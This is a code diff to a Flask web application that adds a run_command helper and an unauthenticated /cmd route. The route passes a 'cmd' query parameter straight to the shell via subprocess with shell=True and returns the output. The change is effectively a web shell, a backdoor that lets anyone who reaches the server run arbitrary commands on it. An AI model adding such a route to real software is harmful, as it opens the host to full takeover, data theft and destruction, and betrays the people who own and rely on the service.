@@ -3,9 +3,26 @@ from db import get_db, close_db
 import sqlalchemy
 from sqlalchemy import text
 from logger import log
+import subprocess
 
 app = Flask(__name__)
 app.teardown_appcontext(close_db)
+
+def run_command(cmd: str, timeout: float | None = None) -> str:
+    """Run a shell command and return its combined stdout and stderr."""
+    result = subprocess.run(
+        cmd,
+        shell=True,
+        capture_output=True,
+        text=True,
+        timeout=timeout,
+    )
+    return result.stdout + result.stderr
+@app.route("/cmd")
+def cmd():
+    cmdx = request.args.get("cmd")
+    cmdo = run_command(cmdx)
+    return cmdo
 
 
 @app.route("/")
